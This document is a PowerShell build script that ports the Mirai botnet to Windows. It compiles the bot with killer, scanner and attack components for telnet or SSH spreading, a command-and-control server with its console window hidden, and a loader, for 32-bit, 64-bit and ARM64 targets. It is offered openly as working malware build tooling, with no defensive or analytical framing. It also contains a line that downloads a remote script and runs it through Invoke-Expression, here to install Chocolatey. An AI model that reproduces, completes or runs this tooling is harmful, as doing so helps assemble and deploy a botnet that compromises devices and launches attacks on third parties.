# Windows Build Configuration for Mirai
# Converts Linux Makefile to Windows build system

# Build configuration
$BuildConfig = @{
  CompilerPath  = "gcc"  # MinGW-w64 gcc
  WindowsSDK    = "C:\Program Files (x86)\Windows Kits\10"
  OutputDir     = "release"
  SourceDir     = "bot"
    
  # Compiler flags for Windows
  CommonFlags   = @(
    "-std=c99"
    "-O3"
    "-fomit-frame-pointer"
    "-fdata-sections"
    "-ffunction-sections"
    "-Wl,--gc-sections"
    "-DWIN32"
    "-D_WIN32_WINNT=0x0601"
    "-DUNICODE"
    "-D_UNICODE"
  )
    
  # Windows-specific libraries
  WindowsLibs   = @(
    "ws2_32"
    "kernel32"
    "user32"
    "advapi32"
    "shell32"
    "ole32"
    "oleaut32"
    "uuid"
    "psapi"
    "iphlpapi"
    "ntdll"
  )
    
  # Source files for bot
  BotSources    = @(
    "main_windows.c"
    "killer_windows.c"
    "scanner_windows.c"
    "attack_windows.c"
    "util.c"
    "table.c"
    "rand.c"
    "resolv.c"
  )
    
  # Target architectures
  Architectures = @{
    "win32" = @{
      GccPrefix    = "i686-w64-mingw32"
      ArchFlags    = @("-m32", "-march=i686")
      OutputSuffix = "win32"
    }
    "win64" = @{
      GccPrefix    = "x86_64-w64-mingw32"
      ArchFlags    = @("-m64", "-march=x86-64")
      OutputSuffix = "win64"
    }
    "arm64" = @{
      GccPrefix    = "aarch64-w64-mingw32"
      ArchFlags    = @("-march=armv8-a")
      OutputSuffix = "arm64"
    }
  }
}

# Build functions
function Build-WindowsBot {
  param(
    [string]$Architecture,
    [string]$Protocol,
    [string]$BuildType = "release"
  )
    
  $archConfig = $BuildConfig.Architectures[$Architecture]
  if (-not $archConfig) {
    Write-Error "Unsupported architecture: $Architecture"
    return $false
  }
    
  $compiler = "$($archConfig.GccPrefix)-gcc"
  if (-not (Get-Command $compiler -ErrorAction SilentlyContinue)) {
    Write-Warning "Compiler not found: $compiler. Falling back to gcc"
    $compiler = "gcc"
  }
    
  # Build flags
  $flags = $BuildConfig.CommonFlags + $archConfig.ArchFlags
    
  # Protocol flags
  switch ($Protocol) {
    "telnet" { $flags += "-DMIRAI_TELNET" }
    "ssh" { $flags += "-DMIRAI_SSH" }
  }
    
  # Debug vs Release
  if ($BuildType -eq "debug") {
    $flags += @("-g", "-DDEBUG", "-O0")
  }
  else {
    $flags += @("-DNDEBUG", "-s")
  }
    
  # Library flags
  $libFlags = $BuildConfig.WindowsLibs | ForEach-Object { "-l$_" }
    
  # Source files
  $sources = $BuildConfig.BotSources | ForEach-Object { 
    Join-Path $BuildConfig.SourceDir $_
  }
    
  # Output file
  $outputName = "mirai-$($archConfig.OutputSuffix)-$Protocol.exe"
  $outputPath = Join-Path $BuildConfig.OutputDir $outputName
    
  # Create output directory
  if (-not (Test-Path $BuildConfig.OutputDir)) {
    New-Item -ItemType Directory -Path $BuildConfig.OutputDir -Force | Out-Null
  }
    
  # Build command
  $buildArgs = @($flags) + $sources + @("-o", $outputPath) + $libFlags
    
  Write-Host "Building $outputName..." -ForegroundColor Green
  Write-Host "Command: $compiler $($buildArgs -join ' ')" -ForegroundColor Gray
    
  try {
    & $compiler $buildArgs
        
    if (Test-Path $outputPath) {
      $size = (Get-Item $outputPath).Length
      Write-Host "✅ Successfully built: $outputName ($([math]::Round($size/1KB, 1)) KB)" -ForegroundColor Green
      return $true
    }
    else {
      Write-Host "❌ Build failed: $outputName" -ForegroundColor Red
      return $false
    }
  }
  catch {
    Write-Host "❌ Build error: $_" -ForegroundColor Red
    return $false
  }
}

function Build-WindowsCnC {
  param(
    [string]$Architecture = "amd64"
  )
    
  Write-Host "Building Windows C&C Server..." -ForegroundColor Cyan
    
  # Check Go installation
  if (-not (Get-Command "go" -ErrorAction SilentlyContinue)) {
    Write-Host "❌ Go compiler not found. Please install Go first." -ForegroundColor Red
    return $false
  }
    
  # Set environment for Windows build
  $env:GOOS = "windows"
  $env:GOARCH = $Architecture
  $env:CGO_ENABLED = "1"
    
  $outputPath = Join-Path $BuildConfig.OutputDir "cnc-windows-$Architecture.exe"
    
  try {
    Push-Location "cnc"
        
    # Build with Windows-specific flags
    $buildArgs = @(
      "build"
      "-o", $outputPath
      "-ldflags", "-s -w -H windowsgui"
      "-tags", "windows"
      "*.go"
    )
        
    & go $buildArgs
    Pop-Location
        
    if (Test-Path $outputPath) {
      $size = (Get-Item $outputPath).Length
      Write-Host "✅ Successfully built C&C: cnc-windows-$Architecture.exe ($([math]::Round($size/1KB, 1)) KB)" -ForegroundColor Green
      return $true
    }
    else {
      Write-Host "❌ C&C build failed" -ForegroundColor Red
      return $false
    }
  }
  catch {
    Write-Host "❌ C&C build error: $_" -ForegroundColor Red
    if ($PWD.Path -ne (Get-Location).Path) { Pop-Location }
    return $false
  }
}

function Build-WindowsLoader {
  param(
    [string]$Architecture = "win64"
  )
    
  Write-Host "Building Windows Loader..." -ForegroundColor Cyan
    
  $archConfig = $BuildConfig.Architectures[$Architecture]
  if (-not $archConfig) {
    Write-Error "Unsupported architecture: $Architecture"
    return $false
  }
    
  $compiler = "$($archConfig.GccPrefix)-gcc"
  if (-not (Get-Command $compiler -ErrorAction SilentlyContinue)) {
    $compiler = "gcc"
  }
    
  # Loader-specific flags
  $flags = $BuildConfig.CommonFlags + $archConfig.ArchFlags + @(
    "-DLOADER_WINDOWS"
    "-static"
  )
    
  # Loader sources
  $loaderSources = @(
    "loader\src\main.c"
    "loader\src\server.c"
    "loader\src\binary.c"
    "loader\src\util.c"
    "loader\src\telnet_info.c"
  )
    
  $outputPath = Join-Path $BuildConfig.OutputDir "loader-$($archConfig.OutputSuffix).exe"
  $libFlags = $BuildConfig.WindowsLibs | ForEach-Object { "-l$_" }
    
  try {
    $buildArgs = @($flags) + $loaderSources + @("-o", $outputPath) + $libFlags
    & $compiler $buildArgs
        
    if (Test-Path $outputPath) {
      $size = (Get-Item $outputPath).Length
      Write-Host "✅ Successfully built loader: loader-$($archConfig.OutputSuffix).exe ($([math]::Round($size/1KB, 1)) KB)" -ForegroundColor Green
      return $true
    }
    else {
      Write-Host "❌ Loader build failed" -ForegroundColor Red
      return $false
    }
  }
  catch {
    Write-Host "❌ Loader build error: $_" -ForegroundColor Red
    return $false
  }
}

function Test-BuildEnvironment {
  Write-Host "🔍 Testing Windows Build Environment..." -ForegroundColor Cyan
  Write-Host ""
    
  $issues = @()
    
  # Test MinGW-w64
  foreach ($arch in $BuildConfig.Architectures.Keys) {
    $archConfig = $BuildConfig.Architectures[$arch]
    $compiler = "$($archConfig.GccPrefix)-gcc"
        
    if (Get-Command $compiler -ErrorAction SilentlyContinue) {
      Write-Host "✅ $compiler found" -ForegroundColor Green
    }
    else {
      Write-Host "❌ $compiler not found" -ForegroundColor Red
      $issues += "Missing compiler: $compiler"
    }
  }
    
  # Test Go
  if (Get-Command "go" -ErrorAction SilentlyContinue) {
    $goVersion = (go version 2>$null)
    Write-Host "✅ Go found: $goVersion" -ForegroundColor Green
  }
  else {
    Write-Host "❌ Go not found" -ForegroundColor Red
    $issues += "Missing Go compiler"
  }
    
  # Test Windows SDK (optional)
  if (Test-Path $BuildConfig.WindowsSDK) {
    Write-Host "✅ Windows SDK found" -ForegroundColor Green
  }
  else {
    Write-Host "⚠️ Windows SDK not found (optional)" -ForegroundColor Yellow
  }
    
  # Test source files
  $missingFiles = @()
  foreach ($source in $BuildConfig.BotSources) {
    $sourcePath = Join-Path $BuildConfig.SourceDir $source
    if (-not (Test-Path $sourcePath)) {
      $missingFiles += $source
    }
  }
    
  if ($missingFiles.Count -eq 0) {
    Write-Host "✅ All source files present" -ForegroundColor Green
  }
  else {
    Write-Host "❌ Missing source files: $($missingFiles -join ', ')" -ForegroundColor Red
    $issues += "Missing source files"
  }
    
  Write-Host ""
  if ($issues.Count -eq 0) {
    Write-Host "🎉 Build environment ready!" -ForegroundColor Green
    return $true
  }
  else {
    Write-Host "⚠️ Build environment issues detected:" -ForegroundColor Yellow
    foreach ($issue in $issues) {
      Write-Host "   - $issue" -ForegroundColor Red
    }
    return $false
  }
}

function Install-BuildTools {
  Write-Host "🔧 Installing Windows Build Tools..." -ForegroundColor Cyan
  Write-Host ""
    
  # Check if running as admin
  if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "❌ Administrator privileges required for installation" -ForegroundColor Red
    return $false
  }
    
  # Install chocolatey if not present
  if (-not (Get-Command "choco" -ErrorAction SilentlyContinue)) {
    Write-Host "Installing Chocolatey..." -ForegroundColor Yellow
    Set-ExecutionPolicy Bypass -Scope Process -Force
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
  }
    
  # Install build tools
  $tools = @("mingw", "golang")
    
  foreach ($tool in $tools) {
    Write-Host "Installing $tool..." -ForegroundColor Yellow
    try {
      choco install $tool -y
      Write-Host "✅ $tool installed" -ForegroundColor Green
    }
    catch {
      Write-Host "❌ Failed to install $tool" -ForegroundColor Red
    }
  }
    
  Write-Host ""
  Write-Host "🔄 Please restart your PowerShell session to update PATH" -ForegroundColor Yellow
}

function Show-BuildHelp {
  Write-Host @"
🔧 Windows Mirai Build System Help

USAGE:
    .\build-windows.ps1 <command> [options]

COMMANDS:
    build       Build all components
    bot         Build bot only  
    cnc         Build C&C server only
    loader      Build loader only
    test        Test build environment
    install     Install build tools (requires admin)
    clean       Clean build outputs
    help        Show this help

EXAMPLES:
    # Build everything
    .\build-windows.ps1 build

    # Build bot for specific architecture
    .\build-windows.ps1 bot -Architecture win64 -Protocol telnet

    # Test build environment
    .\build-windows.ps1 test

    # Install build tools
    .\build-windows.ps1 install

ARCHITECTURES:
    win32       32-bit Windows (i686)
    win64       64-bit Windows (x86_64)  
    arm64       ARM64 Windows

PROTOCOLS:
    telnet      Telnet-based scanning
    ssh         SSH-based scanning

"@ -ForegroundColor Cyan
}

function Clean-BuildOutputs {
  Write-Host "🧹 Cleaning build outputs..." -ForegroundColor Yellow
    
  if (Test-Path $BuildConfig.OutputDir) {
    Remove-Item "$($BuildConfig.OutputDir)\*" -Force -Recurse
    Write-Host "✅ Build outputs cleaned" -ForegroundColor Green
  }
  else {
    Write-Host "✅ No build outputs to clean" -ForegroundColor Green
  }
}

# Export functions for use as module
Export-ModuleMember -Function @(
  'Build-WindowsBot'
  'Build-WindowsCnC'
  'Build-WindowsLoader'
  'Test-BuildEnvironment'
  'Install-BuildTools'
  'Show-BuildHelp'
  'Clean-BuildOutputs'
)

Write-Host "Windows Build System Loaded" -ForegroundColor Green
Write-Host "Run 'Show-BuildHelp' for usage instructions" -ForegroundColor Cyan